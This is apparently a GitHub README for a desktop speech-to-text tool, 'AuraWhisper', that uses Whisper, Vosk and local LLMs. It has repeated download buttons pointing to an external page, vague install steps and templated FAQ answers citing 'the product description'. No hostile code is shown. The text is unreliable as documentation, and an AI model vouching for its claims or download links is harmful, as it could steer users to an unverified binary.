# AuraWhisper v1.2.11 - local AI transcription tool 2026

> **Offline speech-to-text with local AI-assisted refinement for desktop workflows, designed for privacy-focused dictation and proofreading in version 1.2.11.**

[![Platform](https://img.shields.io/badge/Platform-desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.11-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chris-jamesvagg5347/aurawhisper-v1-2-11-local-ai?style=flat-square)](https://github.com/chris-jamesvagg5347/aurawhisper-v1-2-11-local-ai)

---

<p align="center">
  <a href="https://chris-jamesvagg5347.github.io/aurawhisper-v1-2-11-local-ai/">
    <img src="https://img.shields.io/badge/Download-AuraWhisper%20Latest-brightgreen?style=for-the-badge" alt="Download AuraWhisper">
  </a>
</p>

> **[Direct Download - AuraWhisper v1.2.11](https://chris-jamesvagg5347.github.io/aurawhisper-v1-2-11-local-ai/)**

---

[Download Latest Build](https://chris-jamesvagg5347.github.io/aurawhisper-v1-2-11-local-ai/)

---

## Overview

AuraWhisper is a desktop transcription application that keeps processing on your own machine, so speech-to-text does not have to rely on cloud services. It brings together live transcription and local AI tools, letting you record spoken input and refine it into usable text within a single workflow.

This makes it a practical choice for offline note-taking, drafting, documentation, and voice-based editing. With support for Whisper, Vosk, and local LLM integration through Ollama or LM Studio, AuraWhisper can be used in several on-device transcription and cleanup setups.

---

## What it offers

- Local, offline transcription for desktop workflows
- Live transcription preview as you speak
- AI-assisted text cleanup and proofreading
- Global hotkey support for quicker control during use
- Speech-to-text support with Whisper
- On-device live STT support with Vosk
- Local LLM integration through Ollama or LM Studio
- Electron desktop UI for a familiar application experience

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/chris-jamesvagg5347/aurawhisper-v1-2-11-local-ai.git
2. Open the project folder:
   - `cd AuraWhisper`
3. Install the app dependencies according to your desktop runtime setup.
4. Launch the application from the Electron entry point used by your build.

If you are using a packaged release, download the latest build and run the desktop app directly from your system.

---

## How to use it

Launch AuraWhisper, pick the transcription mode you want, and start speaking into your microphone. The app can display a live preview of recognized speech, which makes it easier to track the transcript while it is being created.

For refinement, connect a local LLM provider such as Ollama or LM Studio and route the captured transcript through the proofreading flow. Global hotkeys can help you trigger actions quickly while working, making it simpler to move between recording, reviewing, and editing.

Typical workflow:

1. Open AuraWhisper
2. Select Whisper or Vosk for transcription
3. Start voice input
4. Review the live transcript
5. Apply local AI refinement if needed
6. Copy or reuse the finalized text in your notes or editor

---

## Configuration

Settings are managed in the desktop app and vary based on the transcription engine or local model provider you choose.

Common settings include:
- Microphone and input selection
- Whisper or Vosk mode selection
- Local LLM provider setup for Ollama or LM Studio
- Hotkey preferences
- Transcription and refinement behavior

If your build stores settings in a local configuration file, keep it alongside the application data used by the Electron app.

---

## Requirements

- Desktop environment
- Electron-based runtime/application build
- Local audio input for speech capture
- Enough storage for app files and any local models you choose to use
- Compatible local components for:
  - Whisper transcription
  - Vosk live STT
  - Ollama or LM Studio for local LLM features

---

## FAQ

**Does AuraWhisper work offline?**  
Yes. The product description identifies it as fully local offline processing.

**What transcription engines are supported?**  
The listed features include Whisper and Vosk.

**Can it use a local language model?**  
Yes. Local LLM integration is available through Ollama or LM Studio.

**Where do I change settings?**  
Use the desktop app configuration options, or the local app data files if your build stores preferences there.

**What if transcription is not starting?**  
Check microphone access, confirm the selected speech engine, and verify that any required local services or models are available.

**How do I get updates?**  
Use the latest build link above and check the repository releases or published build artifacts when they are available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
